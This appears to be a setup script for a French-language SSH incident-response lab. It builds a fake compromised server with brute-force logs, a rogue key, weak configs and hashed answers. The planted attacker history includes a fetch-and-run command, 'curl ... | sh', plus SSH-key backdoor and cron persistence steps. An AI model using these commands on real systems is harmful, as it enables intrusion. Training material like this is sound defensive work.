. "$LAB_LIB"
. "$CH/gen-log.sh"
h(){ printf '%s' "$1" | sha256sum | cut -d' ' -f1; }

# --- 1. Tirage aléatoire : chaque stagiaire a son propre incident --------------------------
ATK="203.0.113.$((RANDOM%150+60))"
ADM="198.51.100.$((RANDOM%200+10))"
TYPO="192.168.10.$((RANDOM%200+10))"
NFAIL=$((RANDOM%50+40))
ACCTS=(svc-backup svc-deploy svc-monitor svc-report); ACCT=${ACCTS[RANDOM%4]}
SEED=$((RANDOM*32768+RANDOM))
case $((RANDOM%3)) in 0) ROGUE=/tmp/.u/sync.sh;; 1) ROGUE=/var/tmp/.sys/kworker.sh;; *) ROGUE=/dev/shm/.k/upd.sh;; esac

# --- 2. Arborescence du serveur srv01 (copie de travail, jamais le vrai système) ------------
S="$WORK/srv01"
mkdir -p "$S/etc/ssh" "$S/var/log" "$S/var/spool/cron/crontabs" "$S/home/$ACCT/.ssh" "$S/home/admin"
T=$(mktemp -d)
gen_auth_log "$S/var/log/auth.log" "$ATK" "$NFAIL" "$ACCT" "$ADM" "$TYPO" "$SEED" "$T/tsucc"
TSUCC=$(cat "$T/tsucc")

# --- 3. Vraies clés SSH : une légitime, une posée par l'attaquant ---------------------------
ssh-keygen -q -t ed25519 -N '' -C 'backup@bkp01'    -f "$T/legit"
ssh-keygen -q -t ed25519 -N '' -C 'sync@localhost'  -f "$T/rogue"
ssh-keygen -q -t ed25519 -N '' -C ''                -f "$S/etc/ssh/ssh_host_ed25519_key"
rm -f "$S/etc/ssh/ssh_host_ed25519_key.pub"
cat "$T/legit.pub" "$T/rogue.pub" > "$S/home/$ACCT/.ssh/authorized_keys"
chmod 600 "$S/home/$ACCT/.ssh/authorized_keys"
FPR=$(ssh-keygen -lf "$T/rogue.pub" | awk '{print $2}')

# --- 4. Traces laissées par l'attaquant (historique + persistance cron) ---------------------
H="$S/home/$ACCT/.bash_history"; t=$((TSUCC+25)); : > "$H"
hist(){ t=$((t+${2:-7})); printf '#%s\n%s\n' "$t" "$1" >> "$H"; }
hist 'id' 3; hist 'uname -a'; hist 'cat /etc/passwd' 9; hist 'ls -la ~' 12
hist 'mkdir -p ~/.ssh' 20
hist "echo '$(cat "$T/rogue.pub")' >> ~/.ssh/authorized_keys" 6
hist 'chmod 600 ~/.ssh/authorized_keys' 4
hist "mkdir -p $(dirname "$ROGUE")" 15
hist "echo 'curl -s http://198.51.100.99/p | sh' > $ROGUE" 8
hist "chmod +x $ROGUE" 3
hist "(crontab -l 2>/dev/null; echo '*/10 * * * * $ROGUE >/dev/null 2>&1') | crontab -" 11
hist 'history -c' 5
printf '# crontab de %s\n0 2 * * * /usr/local/bin/backup.sh\n*/10 * * * * %s >/dev/null 2>&1\n' "$ACCT" "$ROGUE" > "$S/var/spool/cron/crontabs/$ACCT"
touch -d "@$((TSUCC+120))" "$S/home/$ACCT/.ssh/authorized_keys" "$S/var/spool/cron/crontabs/$ACCT"
touch -d "@$((TSUCC+300))" "$H"

# --- 5. Configuration à durcir : sshd_config et pare-feu ------------------------------------
cat > "$S/etc/ssh/sshd_config" <<'CFG'
# sshd_config de srv01
Port 22
PermitRootLogin yes
PasswordAuthentication yes
PubkeyAuthentication yes
MaxAuthTries 6
UsePAM yes
X11Forwarding no
PrintMotd no
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server
CFG
cat > "$S/etc/nftables.conf" <<'NFT'
#!/usr/sbin/nft -f
flush ruleset
table inet filter {
  chain input {
    type filter hook input priority 0; policy drop;
    ct state established,related accept
    iif lo accept
    tcp dport 22 accept
    tcp dport { 80, 443 } accept
  }
}
NFT
touch -d '2026-11-01 09:00' "$S/etc/ssh/sshd_config" "$S/etc/nftables.conf"

# --- 6. Vérité (hachée, comme les autres défis) -----------------------------------------------
LOG="$S/var/log/auth.log"
TOTAL=$(grep -c 'Failed password' "$LOG")
NIP=$(grep 'Failed password' "$LOG" | grep -c "from $ATK ")
HSUCC=$(grep 'Accepted password' "$LOG" | grep "for $ACCT from $ATK " | head -1 | awk '{print $3}')
{
  echo "echecs_total:$(h "$TOTAL")"
  echo "ip_attaquante:$(h "$ATK")"
  echo "echecs_ip:$(h "$NIP")"
  echo "compte:$(h "$ACCT")"
  echo "heure_succes:$(h "$HSUCC")"
  echo "statut:$(h compromission)"
  echo "empreinte_cle:$(h "$FPR")"
  echo "cron_malveillant:$(h "$ROGUE")"
  echo "_log:$(sha256sum "$LOG" | cut -d' ' -f1)"
} > "$ANSWER_FILE"
rm -rf "$T"

# --- 7. Fichiers remis au stagiaire ---------------------------------------------------------
cat > "$WORK/reponses.txt" <<'R'
# Une ligne par constat : cle=valeur (sans espace autour du signe =)
echecs_total=
ip_attaquante=
echecs_ip=
compte=
heure_succes=
statut=
empreinte_cle=
cron_malveillant=
R
cat > "$WORK/rapport.md" <<'R'
# Rapport d'incident SSH - srv01

## Faits
A COMPLETER

## Interprétation
A COMPLETER

## Impact
A COMPLETER

## Remédiation
A COMPLETER

## Retest
A COMPLETER
R
printf '#!/usr/bin/env bash\ncd "$(dirname "$0")" || exit 1\nWORK="$PWD"; CH="%s"\n. "$CH/controls.sh"\nmkdir -p preuves\nrun_controls | tee preuves/retest.txt\n' "$CH" > "$WORK/retest.sh"
chmod +x "$WORK/retest.sh"
